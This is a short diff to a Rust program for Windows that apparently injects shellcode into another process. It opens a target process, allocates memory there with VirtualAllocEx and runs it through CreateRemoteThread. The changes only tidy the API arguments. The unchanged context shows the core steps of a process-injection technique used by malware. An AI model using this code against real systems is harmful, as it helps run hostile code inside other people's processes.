@@ -1,7 +1,6 @@
 use std::{
     mem::transmute,
     process::exit,
-    ptr::{null, null_mut},
 };
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::{
@@ -71,7 +70,7 @@ fn main() {
         println!("[i] Allocating Memory in the Process");
         let address = VirtualAllocEx(
             h_process,
-            Some(null_mut()),
+            None,
             buf.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -106,12 +105,12 @@ fn main() {
         println!("[+] Creating a Remote Thread");
         let h_thread = CreateRemoteThread(
             h_process,
-            Some(null()),
+            None,
             0,
             Some(transmute(address)),
-            Some(null()),
+            None,
             0,
-            Some(null_mut()),
+            None,
         ).unwrap_or_else(|e| {
             eprintln!("[!] CreateRemoteThread Failed With Error: {}", e);
             CloseHandle(h_process);
